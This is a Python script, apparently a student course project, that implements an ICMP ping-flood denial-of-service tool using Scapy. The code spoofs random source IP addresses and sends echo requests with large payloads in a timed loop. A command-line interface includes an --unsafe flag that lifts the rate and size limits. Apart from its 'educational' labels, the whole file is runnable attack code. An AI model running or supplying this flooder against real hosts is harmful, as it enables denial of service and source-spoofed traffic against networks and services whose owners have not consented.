#!/usr/bin/env python3
"""
SecureNet DC - ICMP Flood Attack Simulator
CPEG 460 Bonus Project

Simulates ICMP flood (ping flood) attack for educational purposes.
This attack overwhelms the target with ICMP echo requests.

WARNING: For educational use only in controlled environments.
"""

from scapy.all import IP, ICMP, send, Raw
import time
import random
import logging

logger = logging.getLogger(__name__)


class ICMPFlood:
    """
    ICMP Flood (Ping Flood) Attack Simulator.

    Sends large volumes of ICMP echo request packets to
    consume target bandwidth and processing resources.
    """

    def __init__(self, target_ip, safe_mode=True):
        """
        Initialize ICMP Flood attack.

        Args:
            target_ip: Target IP address
            safe_mode: Limit attack intensity (default: True)
        """
        self.target_ip = target_ip
        self.safe_mode = safe_mode
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.max_pps = 50 if safe_mode else 500
        self.max_size = 1000 if safe_mode else 65500

        logger.info(f"ICMP Flood initialized: target={target_ip}")

    def craft_packet(self, src_ip=None, size=1000):
        """
        Craft an ICMP echo request packet.

        Args:
            src_ip: Source IP (random if None for spoofing)
            size: Payload size in bytes

        Returns:
            Scapy packet object
        """
        # Limit size in safe mode
        if self.safe_mode and size > self.max_size:
            size = self.max_size

        # Random source IP if not specified
        if src_ip is None:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                     f"{random.randint(1,254)}.{random.randint(1,254)}"

        # Craft IP layer
        ip_layer = IP(
            src=src_ip,
            dst=self.target_ip
        )

        # Craft ICMP echo request
        icmp_layer = ICMP(
            type=8,  # Echo request
            code=0,
            id=random.randint(0, 65535),
            seq=random.randint(0, 65535)
        )

        # Payload
        payload = Raw(load='X' * size)

        return ip_layer / icmp_layer / payload

    def start(self, duration=30, pps=None, size=1000, callback=None):
        """
        Start the ICMP flood attack.

        Args:
            duration: Attack duration in seconds
            pps: Packets per second
            size: Packet payload size
            callback: Progress callback function

        Returns:
            dict: Attack statistics
        """
        if pps is None:
            pps = self.max_pps
        elif self.safe_mode and pps > self.max_pps:
            pps = self.max_pps
            logger.warning(f"Safe mode: PPS limited to {self.max_pps}")

        if self.safe_mode and size > self.max_size:
            size = self.max_size
            logger.warning(f"Safe mode: Size limited to {self.max_size}")

        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        start_time = time.time()
        interval = 1.0 / pps

        logger.warning(f"[!] Starting ICMP Flood against {self.target_ip}")
        logger.warning(f"[!] Duration: {duration}s, PPS: {pps}, Size: {size}")

        try:
            while self.running and (time.time() - start_time) < duration:
                # Craft and send packet
                pkt = self.craft_packet(size=size)
                send(pkt, verbose=0)
                self.packets_sent += 1
                self.bytes_sent += size + 28  # IP + ICMP header

                # Progress callback
                if callback and self.packets_sent % 50 == 0:
                    elapsed = time.time() - start_time
                    callback({
                        'packets_sent': self.packets_sent,
                        'bytes_sent': self.bytes_sent,
                        'elapsed': elapsed,
                        'rate': self.packets_sent / elapsed if elapsed > 0 else 0,
                        'bandwidth_mbps': (self.bytes_sent * 8 / elapsed) / 1e6 if elapsed > 0 else 0
                    })

                # Rate limiting
                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        finally:
            self.running = False

        elapsed = time.time() - start_time
        stats = {
            'attack_type': 'ICMP_FLOOD',
            'target': self.target_ip,
            'duration': elapsed,
            'packets_sent': self.packets_sent,
            'bytes_sent': self.bytes_sent,
            'average_pps': self.packets_sent / elapsed if elapsed > 0 else 0,
            'bandwidth_mbps': (self.bytes_sent * 8 / elapsed) / 1e6 if elapsed > 0 else 0
        }

        logger.info(f"[+] Attack complete: {self.packets_sent} packets, "
                   f"{self.bytes_sent/1024:.1f} KB")
        return stats

    def stop(self):
        """Stop the attack."""
        self.running = False
        logger.info("ICMP Flood stopped")


def main():
    """Command-line interface for ICMP flood."""
    import argparse

    parser = argparse.ArgumentParser(
        description='ICMP Flood Attack Simulator (Educational)'
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Duration in seconds (default: 30)')
    parser.add_argument('-r', '--rate', type=int, default=50,
                       help='Packets per second (default: 50)')
    parser.add_argument('-s', '--size', type=int, default=1000,
                       help='Packet size in bytes (default: 1000)')
    parser.add_argument('--unsafe', action='store_true',
                       help='Disable safe mode')

    args = parser.parse_args()

    attack = ICMPFlood(args.target, safe_mode=not args.unsafe)
    attack.start(duration=args.duration, pps=args.rate, size=args.size)


if __name__ == '__main__':
    main()
